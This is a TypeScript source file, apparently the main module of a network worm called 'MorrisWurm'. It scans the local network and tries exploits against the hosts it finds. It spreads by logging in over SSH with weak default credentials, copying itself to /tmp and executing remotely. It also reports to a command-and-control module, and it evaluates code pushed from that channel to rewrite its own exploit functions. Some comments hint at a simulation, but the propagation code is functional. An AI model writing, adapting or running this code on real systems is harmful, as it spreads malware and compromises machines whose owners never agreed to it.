import { recon } from './modules/recon';
// Import the entire module as a namespace to allow for dynamic patching
import * as exploit from './modules/exploit';
import { reportFailure } from './modules/c2';
import { generateKey, rotateKey } from './modules/crypto';
import { initializeConnector } from './modules/connector';
import { logger, startDisguise } from './utils';
import { Target } from '../types/index';
import { Client } from 'ssh2';
import fs from 'fs';
import path from 'path';
import vm from 'vm';

const EXPLOIT_SUCCESS_RATE = 0.3; // 30% chance of success

const selfReplicate = (target: Target): Promise<void> => {
    return new Promise((resolve, reject) => {
        logger.info(`Module [Replicate]: Initiating self-replication sequence to ${target.ip}...`);
        
        const conn = new Client();
        const timeout = 10000; // 10 second timeout

        const timer = setTimeout(() => {
            conn.end();
            reject(new Error(`Replication to ${target.ip} timed out after ${timeout / 1000}s`));
        }, timeout);

        conn.on('ready', () => {
            logger.info(`Module [Replicate]: SSH connection established with ${target.ip}.`);
            
            conn.sftp((err, sftp) => {
                if (err) {
                    clearTimeout(timer);
                    conn.end();
                    return reject(err);
                }

                const localPayloadPath = path.join(__dirname, 'worm.ts');
                const remotePayloadPath = `/tmp/worm_payload.ts`;
                
                logger.info(`Module [Replicate]: Using SFTP to copy payload to ${target.ip}:${remotePayloadPath}`);

                const readStream = fs.createReadStream(localPayloadPath);
                const writeStream = sftp.createWriteStream(remotePayloadPath);
                
                writeStream.on('close', () => {
                   logger.info(`Module [Replicate]: Payload transfer complete.`);
                   logger.info(`Module [Replicate]: Executing payload remotely on ${target.ip}...`);

                   // Simulate remote execution
                   conn.exec(`ts-node ${remotePayloadPath}`, (err, stream) => {
                       if (err) {
                           clearTimeout(timer);
                           conn.end();
                           return reject(err);
                       }
                       stream.on('close', () => {
                           logger.info(`Module [Replicate]: Remote execution finished. Replication successful.`);
                           clearTimeout(timer);
                           conn.end();
                           resolve();
                       }).on('data', (data: Buffer) => {
                           logger.info(`[REMOTE:${target.ip}] STDOUT: ${data.toString().trim()}`);
                       }).stderr.on('data', (data: Buffer) => {
                           logger.warn(`[REMOTE:${target.ip}] STDERR: ${data.toString().trim()}`);
                       });
                   });
                });
                
                writeStream.on('error', (sftpErr) => {
                    clearTimeout(timer);
                    conn.end();
                    reject(sftpErr);
                });

                readStream.pipe(writeStream);
            });

        }).on('error', (connErr) => {
            clearTimeout(timer);
            reject(connErr);
        }).connect({
            host: target.ip,
            port: target.ports.includes(22) ? 22 : target.ports[0], // Prefer port 22 if available
            username: process.env.SSH_USER || 'testuser', // Weak creds from env or default
            password: process.env.SSH_PASS || 'password'
        });
    });
};

const applyMutation = (mutatedCode: string | null): void => {
    if (!mutatedCode) {
        return;
    }
    try {
        logger.info('Module [Mutation]: Applying new code received from C2...');

        // Create a secure sandbox. Only expose necessary, safe globals.
        const sandbox = {
            logger,
            console,
            setTimeout,
            // Expose any other safe utilities the mutation might need.
        };
        vm.createContext(sandbox);

        // The code from C2 should be an expression that evaluates to an object
        // whose keys are function names in 'exploit.ts' and values are the new functions.
        const script = new vm.Script(`(${mutatedCode})`);
        const newImplementations = script.runInContext(sandbox);

        // Overwrite the functions in the imported 'exploit' module object.
        // This is a form of live-patching.
        Object.assign(exploit, newImplementations);

        logger.info('Module [Mutation]: Successfully applied mutation. Exploit behavior has been altered.');

    } catch (e: any) {
        logger.error(`Module [Mutation]: Failed to apply mutation: ${e.message}`);
    }
};

async function main(): Promise<void> {
    logger.info(`MorrisWurm slithering awake... [PID: ${process.pid}]`);
    startDisguise();
    initializeConnector(applyMutation);

    const BOOTSTRAP_KEY = process.env.BOOTSTRAP_KEY;
    let currentKey: string;

    if (BOOTSTRAP_KEY && /^[0-9a-fA-F]{64}$/.test(BOOTSTRAP_KEY)) {
        currentKey = BOOTSTRAP_KEY;
        logger.info('Initialized session key from BOOTSTRAP_KEY environment variable.');
    } else {
        if (BOOTSTRAP_KEY) {
            logger.warn('BOOTSTRAP_KEY environment variable is invalid (must be 64 hex characters). Generating a new random key.');
        }
        currentKey = generateKey();
    }
    
    let hopCount = 0;
    const TTL_HOPS = 20;
    let failureCount = 0;

    while (hopCount < TTL_HOPS) {
        const targets = await recon.scanLocalNet();
        for (const target of targets) {
            if (await exploit.attemptExploit(target, currentKey, EXPLOIT_SUCCESS_RATE)) {
                try {
                    await selfReplicate(target);
                    hopCount++; // Only increment on successful replication
                    logger.info(`Successful hop! Count is now ${hopCount}.`);
                } catch (replicationError: any) {
                    logger.error(`Replication to ${target.ip} failed: ${replicationError.message}`);
                    await reportFailure({ type: 'replication_fail', details: replicationError.message, targetIp: target.ip }, currentKey);
                }
            } else {
                failureCount++;
                const error = exploit.getLastError();
                await reportFailure({ ...error, targetIp: target.ip }, currentKey);
                
                // Rotate key on every 3rd failure.
                if (failureCount > 0 && failureCount % 3 === 0) {
                    currentKey = rotateKey(currentKey);
                    logger.info(`Rotated session key after ${failureCount} cumulative failures.`);
                }
            }
        }
        
        if (targets.length === 0) {
            logger.info('No targets found in this cycle. Waiting before next scan.');
        }

        logger.info(`Loop tick complete. Successful hops: ${hopCount}/${TTL_HOPS}. Cumulative failures: ${failureCount}.`);
        
        await new Promise(resolve => setTimeout(resolve, 5000));
    }

    logger.info(`TTL cap of ${TTL_HOPS} reached—poof`);
    process.exit(0);
}

main().catch(err => {
    logger.error('A fatal error occurred:', err);
    process.exit(1);
});